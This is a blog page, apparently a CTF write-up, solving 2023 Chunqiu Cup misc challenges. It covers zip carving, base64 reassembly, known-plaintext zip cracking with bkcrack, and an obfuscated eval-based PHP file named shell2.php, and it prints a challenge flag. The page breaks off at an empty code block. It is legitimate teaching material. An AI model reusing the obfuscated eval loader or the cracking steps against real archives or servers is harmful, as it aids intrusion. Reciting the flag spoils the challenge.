@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>2023 春秋杯冬季赛 Misc Writeup - ⚡Lunatic BLOG⚡</title><meta name="author" content="Lunatic">
+<meta name="author-link" content="https://goodlunatic.github.io">
+<meta name="description" content="后来再回头看自己当初没做出来的题，也是感触颇深" /><meta name="keywords" content='CTF, Writeup, Misc' />
+  <meta itemprop="name" content="2023 春秋杯冬季赛 Misc Writeup">
+  <meta itemprop="description" content="后来再回头看自己当初没做出来的题，也是感触颇深">
+  <meta itemprop="datePublished" content="2024-07-17T20:31:08+08:00">
+  <meta itemprop="dateModified" content="2024-07-17T20:31:08+08:00">
+  <meta itemprop="wordCount" content="218">
+  <meta itemprop="keywords" content="CTF,Writeup,Misc"><meta property="og:url" content="http://localhost:1313/posts/5de0d7e/">
+  <meta property="og:site_name" content="⚡Lunatic BLOG⚡">
+  <meta property="og:title" content="2023 春秋杯冬季赛 Misc Writeup">
+  <meta property="og:description" content="后来再回头看自己当初没做出来的题，也是感触颇深">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-07-17T20:31:08+08:00">
+    <meta property="article:modified_time" content="2024-07-17T20:31:08+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Misc">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="2023 春秋杯冬季赛 Misc Writeup">
+  <meta name="twitter:description" content="后来再回头看自己当初没做出来的题，也是感触颇深">
+      <meta name="twitter:site" content="@https://twitter.com/goodlunatic007">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://www.nssctf.cn/files/2024/4/28/8fdad6c6ee.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/posts/5de0d7e/" /><link rel="prev" href="http://localhost:1313/posts/2125dc5/" /><link rel="next" href="http://localhost:1313/posts/01ebd40/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "2023 春秋杯冬季赛 Misc Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/5de0d7e\/"
+    },"genre": "posts","keywords": "CTF, Writeup, Misc","wordcount":  218 ,
+    "url": "http:\/\/localhost:1313\/posts\/5de0d7e\/","datePublished": "2024-07-17T20:31:08+08:00","dateModified": "2024-07-17T20:31:08+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Lunatic"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="⚡Lunatic BLOG⚡"><span class="header-title-pre">⚡</span><span id="typeit-header-desktop" class="typeit"></span></a><span id="typeit-header-subtitle-desktop" class="typeit header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/archives/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="⚡Lunatic BLOG⚡"><span class="header-title-pre">⚡</span><span id="typeit-header-title-mobile" class="typeit"></span></a><span id="typeit-header-subtitle-mobile" class="typeit header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/archives/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=""></aside>
+
+<article class="page single">
+  <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>2023 春秋杯冬季赛 Misc Writeup</span>
+    </h1></div><div class="post-meta">
+    <div class="post-meta-line"><span class="post-author"><a href="https://goodlunatic.github.io" title="Author"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img loading="lazy" src="https://www.nssctf.cn/files/2024/4/28/7f130a1387.png" alt="Lunatic" data-title="Lunatic" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Lunatic</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/writeup/" class="post-category" title="Category - Writeup"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Writeup</a></span></div><div class="post-meta-line"><span title="published on &lt;no value&gt;"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-07-17">2024-07-17</time></span>&nbsp;<span title=""><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+  </div><div class="details toc" id="toc-static"
+    data-kept="false">
+    <div class="details-summary toc-title">
+      <span>Contents</span>
+      <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+    </div>
+    <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#谁偷吃的了我的外卖">谁偷吃的了我的外卖</a></li>
+    <li><a href="#明文混淆">明文混淆</a></li>
+    <li><a href="#module">Module</a></li>
+  </ul>
+</nav></div>
+  </div><div class="content" id="content"><p>后来再回头看自己当初没做出来的题，也是感触颇深</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240802235753699.png" alt="/posts/5de0d7e/imgs/image-20240802235753699.png" srcset="/posts/5de0d7e/imgs/image-20240802235753699.png?size=small, /posts/5de0d7e/imgs/image-20240802235753699.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240802235753699.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240802235753699.png" style="--width: 1867px;--aspect-ratio: 1867 / 979;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="谁偷吃的了我的外卖" class="heading-element">
+  <a href="#%e8%b0%81%e5%81%b7%e5%90%83%e7%9a%84%e4%ba%86%e6%88%91%e7%9a%84%e5%a4%96%e5%8d%96" class="heading-mark"></a>谁偷吃的了我的外卖</h2><p>附件给了一张 jpg 图片，foremost 一下可以得到一个压缩包，解压得到另一个加密的压缩包</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717203405847.png" alt="/posts/5de0d7e/imgs/image-20240717203405847.png" srcset="/posts/5de0d7e/imgs/image-20240717203405847.png?size=small, /posts/5de0d7e/imgs/image-20240717203405847.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717203405847.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717203405847.png" style="--width: 1751px;--aspect-ratio: 1751 / 1186;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>看到里面有很多标好序号的文件，然后后面还跟有一串字符串</p>
+<p>根据压缩包注释中的提示：- 要用 / 替换，基本可以猜测就是 base64 编码了</p>
+<p>使用 Winrar 的生成报告功能提取所有文件的文件名</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717203755759.png" alt="/posts/5de0d7e/imgs/image-20240717203755759.png" srcset="/posts/5de0d7e/imgs/image-20240717203755759.png?size=small, /posts/5de0d7e/imgs/image-20240717203755759.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717203755759.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717203755759.png" style="--width: 2016px;--aspect-ratio: 2016 / 1036;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>但是提取出来的文件名是乱序的，因此我写一个脚本排序并提取，然后把 - 用 / 替换</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 将数据按 &#34;_&#34; 前面的数字排序</span>
+</span></span><span class="line"><span class="cl"><span class="n">sorted_data</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># print(sorted_data[:20])</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 连接排序后的字符串部分</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">item</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">sorted_data</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>将提取出来的数据 base64 解码后发现少了 zip 的文件头，之前压缩包中的注释也提示了这个</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717204018748.png" alt="/posts/5de0d7e/imgs/image-20240717204018748.png" srcset="/posts/5de0d7e/imgs/image-20240717204018748.png?size=small, /posts/5de0d7e/imgs/image-20240717204018748.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717204018748.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717204018748.png" style="--width: 3770px;--aspect-ratio: 3770 / 2024;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>加上文件头后 From Hex 解码即可得到一个压缩包</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717204122425.png" alt="/posts/5de0d7e/imgs/image-20240717204122425.png" srcset="/posts/5de0d7e/imgs/image-20240717204122425.png?size=small, /posts/5de0d7e/imgs/image-20240717204122425.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717204122425.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717204122425.png" style="--width: 1751px;--aspect-ratio: 1751 / 1186;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>在那个 md 文件中得到 flag 的第一部分</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717204150904.png" alt="/posts/5de0d7e/imgs/image-20240717204150904.png" srcset="/posts/5de0d7e/imgs/image-20240717204150904.png?size=small, /posts/5de0d7e/imgs/image-20240717204150904.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717204150904.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717204150904.png" style="--width: 1194px;--aspect-ratio: 1194 / 1053;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后回头看之前那个压缩包，发现里面的两个文件和这个压缩包中的一样</p>
+<p>因此猜测需要明文攻击，钥匙.png 也提示了我们需要用的压缩软件和压缩格式</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717205052042.png" alt="/posts/5de0d7e/imgs/image-20240717205052042.png" srcset="/posts/5de0d7e/imgs/image-20240717205052042.png?size=small, /posts/5de0d7e/imgs/image-20240717205052042.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717205052042.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717205052042.png" style="--width: 1784px;--aspect-ratio: 1784 / 895;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>方法一：Advanced Archive Password Recovery</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717204322093.png" alt="/posts/5de0d7e/imgs/image-20240717204322093.png" srcset="/posts/5de0d7e/imgs/image-20240717204322093.png?size=small, /posts/5de0d7e/imgs/image-20240717204322093.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717204322093.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717204322093.png" style="--width: 694px;--aspect-ratio: 694 / 674;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>爆破完后即可得到解密后的压缩包，在 txt.galf 中得到 reverse 的第二段 flag</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717204430552.png" alt="/posts/5de0d7e/imgs/image-20240717204430552.png" srcset="/posts/5de0d7e/imgs/image-20240717204430552.png?size=small, /posts/5de0d7e/imgs/image-20240717204430552.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717204430552.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717204430552.png" style="--width: 1968px;--aspect-ratio: 1968 / 1327;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>方法二：bkcrack</p>
+<p>把 钥匙.png 用 bandzip 的 正常压缩格式 压缩为 flag.zip，然后爆破密钥即可</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717204906602.png" alt="/posts/5de0d7e/imgs/image-20240717204906602.png" srcset="/posts/5de0d7e/imgs/image-20240717204906602.png?size=small, /posts/5de0d7e/imgs/image-20240717204906602.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717204906602.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717204906602.png" style="--width: 1734px;--aspect-ratio: 1734 / 927;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>CyberChef 中 reverse 一下即可得到最后的 flag：flag{W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9}</p>
+<h2 id="明文混淆" class="heading-element">
+  <a href="#%e6%98%8e%e6%96%87%e6%b7%b7%e6%b7%86" class="heading-mark"></a>明文混淆</h2><p>附件给了一个压缩包，打开一看发现是 store 加密，因此猜测需要明文攻击</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717211823123.png" alt="/posts/5de0d7e/imgs/image-20240717211823123.png" srcset="/posts/5de0d7e/imgs/image-20240717211823123.png?size=small, /posts/5de0d7e/imgs/image-20240717211823123.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717211823123.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717211823123.png" style="--width: 2056px;--aspect-ratio: 2056 / 1003;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>去网上搜了一下文件大小为 35821 的 LICENSE.txt，发现有个统一的标题</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717211804575.png" alt="/posts/5de0d7e/imgs/image-20240717211804575.png" srcset="/posts/5de0d7e/imgs/image-20240717211804575.png?size=small, /posts/5de0d7e/imgs/image-20240717211804575.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717211804575.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717211804575.png" style="--width: 3280px;--aspect-ratio: 3280 / 1984;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717211914785.png" alt="/posts/5de0d7e/imgs/image-20240717211914785.png" srcset="/posts/5de0d7e/imgs/image-20240717211914785.png?size=small, /posts/5de0d7e/imgs/image-20240717211914785.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717211914785.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717211914785.png" style="--width: 1990px;--aspect-ratio: 1990 / 1259;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这个标题的长度也满足了明文攻击的要求，因此我们使用 bkcrack 进行明文攻击</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717212014643.png" alt="/posts/5de0d7e/imgs/image-20240717212014643.png" srcset="/posts/5de0d7e/imgs/image-20240717212014643.png?size=small, /posts/5de0d7e/imgs/image-20240717212014643.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717212014643.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717212014643.png" style="--width: 1734px;--aspect-ratio: 1734 / 927;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>在 shell2.php 中得到以下 php 代码，是微盾php混淆</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O00OO0</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="s2">&#34;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&#34;</span><span class="p">);</span><span class="nv">$O00O0O</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">3</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">6</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">33</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">};</span><span class="nv">$O0OO00</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">33</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">10</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">10</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">};</span><span class="nv">$OO0O00</span><span class="o">=</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">18</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">3</span><span class="p">}</span><span class="o">.</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="o">.</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">};</span><span class="nv">$OO0000</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">7</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">13</span><span class="p">};</span><span class="nv">$O00O0O</span><span class="o">.=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">22</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">36</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">29</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">26</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">32</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">35</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">26</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">};</span><span class="k">eval</span><span class="p">(</span><span class="nv">$O00O0O</span><span class="p">(</span><span class="s2">&#34;JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里这道题比较简单，只要按照步骤依次 echo 出来就能得到 flag</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
